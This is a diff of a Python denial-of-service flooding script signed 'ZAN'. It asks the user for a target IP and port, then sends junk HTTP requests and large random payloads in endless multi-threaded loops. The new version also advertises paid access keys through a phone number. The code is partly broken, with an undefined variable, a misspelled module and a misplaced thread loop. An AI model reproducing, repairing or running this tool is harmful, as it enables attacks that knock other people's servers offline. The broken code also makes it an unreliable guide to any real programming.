@@ -1,157 +1,298 @@
 import threading
-import time 
-import socket, requests
-import random, os, sys
-socks5 = ["""139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80
-139.06.27.47:443 172.104.65.78:80"""]
+import os, sys
+import time
+import socket, requests 
+import random
+userip = ["""45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:8080
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443
+45.68.71.21:443"""]
+acceptall = [""" https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com """]
+all = [""" https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/
+https://merdeka.com/ """]
+socks5= [""" 192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/
+192.186.28.1:443 https://google.com/ https://duck.id.com/ """]
 useragents=["""Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
@@ -166,84 +307,98 @@ useragents=["""Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Fir
 "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
 "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
 "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"""]
-ref=['http://www.bing.com/search?q=',
-'https://www.yandex.com/yandsearch?text=',
-'https://duckduckgo.com/?q=']
-ip = str(input("[ ! ] Enter the IP you want to attack >>= "))
-port = int(input("[ ? ] Port/t >>="))
-pack = int(input("[ ? ] Packets/s >>="))
-th = int(input("Threads/t >>="))
+
+print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
+              |  LAYER4  |  TIME:LIFETIME |
+              |  LAYER7  |   TCP:443/80   |
+              |   TCP    |      UDP:17091    |
+              |   UDP    |
+              """)
+def kok():
+ print("Buy Key? chat:085871151230")
+ mopon = str(input("code >= "))
+ if mopon == "lifetime20":
+    unlock = 2
+ else:
+    unlock = 1
+ if unlock == 1:
+    print("ORDER DEK")
+ if unlock == 2:
+    print("VĪP DÉTÉÇT")
+kok()
+ip = str(input("IP ATTACK>="))
+ip = socket.gethostbyname(ip)
+port = int(input("PORT >= "))
+pack = int(input("[ ? ] how long do you want Packet/s >="))
+th = int(input("[ ? ] how long do you want Thread/t >="))
 def randomip():
-  data4 = random._urandom(4500)
-  lol = random.choice(ref)
   randip = [192, 168, 0, 1]
-  randip1 = random.randint(1,444)
-  randip2 = random.randint(3,555)
-  randip3 = random.randint(4,555)
-  randip4 = random.randint(5,555)
+  randip1 = random.randint(3,255)
+  randip2 = random.randint(3,255)
+  randip3 = random.randint(3,255)
+  randip4 = random.randint(3,255)
+  randip5 = random.randint(3,255)
+ 
   
   randip.append(randip1)
   randip.append(randip2)
   randip.append(randip3)
   randip.append(randip4)
+  randip.append(randip5)
   
-  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4])
-  return (randip)
-def join():
-  global useragents, ref, socks5
-  hh = random._urandom(7500)
+
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5])
+  return(randip)
+
+def start():
+  global userip, acceptall, all, useragents, socks5
+  time.sleep(0.01)
+  hh = random._urandom(999999)
   xx = int(0)
-  userddos = "UserAgents"+random.choice(useragents)+"\r\n"
-  refall = random.choice(ref)
-  sockzan = "Socket: "+random.choice(socks5)+"\r\n"
-  get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-  post_host = "POST /Attacked-by-HAHA HTTP/1.1\r\nHost: " + ip + "\r\n"
-  get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
-  main_req = userddos + refall + sockzan + get_host + post_host + get_data
+  nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
+  sockall = random.choice(socks5)+random.choice(all)+random.choice(useragents)+random.choice(userip)+random.choice(acceptall)+"\r\n"
+  lolall = random.choice(useragents)+random.choice(userip)+"\r\n"
+  agentall = "UserAgents: "+random.choice(useragents)+random.choice(userip)+random.choice(all)+random.choice(socks5)+random.choice(acceptall)+"\r\n"
+  cekall = "Bantai: "+random.choice(all)+random.choice(userip)+random.choice(acceptall)+"\r\n"
+  ipser = "IP: "+random.choice(userip)+"\r\n"
+  accept = random.choice(acceptall)+"\r\n"
+  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+  main_req = ipser + cekall + sockall + lolall + nolakall + agentall + content + length + accept + target_host + "\r\n"
   while True:
         try:
-           s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-           s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-           s.connect((str(ip),int(port)))
-           s.send(str.encode(main_req))
-           for i in range(pack):
-               s.connect((str(ip),int(port)))
-               s.send(str.encode(main_req))
-               print("[!] DDOS BY ZÂN [!]")
-        except:
-             s.close()
-             print('[+] server error')
-def join2():
-  global useragents, ref, socks5
-  data = random._urandom(85000)
-  data2 = int(0)
-  userbig = "UserAgents: "+random.choice(useragents)+random.choice(socks5)+"\r\n"
-  reflol = random.choice(ref)+"\r\n"
-  sock = random.choice(socks5)+"\r\n"
-  get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-  post_host = "POST /Attacked-by-HAHA HTTP/1.1\r\nHost: " + ip + "\r\n"
-  get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
-  while  True:
-         try:
-            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM )
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
-            s.send((data))
-            for x in range(pack):
-              s.connect((str(ip),int(port)))
-              s.send(str.encode(main_req))
-              s.send((data))
-              print("[!] DDOS BY ZÂN [!]")
-         except:
-              s.close()
-              print('[+] server error')
-    
-if __name__=='__main__':
- for i in range(th):
-   th = threading.Thread(target=join)
-   th2 = threading.Thread(target=join2)
-   th.start()
+            for i in range(pack):
+                s.send(str.encode(main_req))
+            xx += random.randint(0, int(pack))
+            print("SÉRVÉR {1} CRÂSH BY ZÁN")
+        except:
+            s.close()
+            print('[+] server error')
+def stack():
+ data = random._urandom(5000)
+ i = random.choice(("[*]","[!]","[#]"))
+ while True:
+       try:
+         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         s.connect((ip,port))
+         s.sendto((data))
+         s.send(str.encode(main_req))
+         for y in range(pack):
+          s.sendto(data)
+          s.send(str.encode(main_req))
+          print("SÉRVÉR {1} CRÂSH BY ZÁN")
+       except:
+          print("[+] server error")
+         
+ for x in range(th):
+   th = threading.Thread(target=start)
+   th2 = threadin.Thread(target=stack)
    th2.start()
- for i in range(60000):
+   th.start()
+ for i in range(85000):
    th.join()
    th2.join()
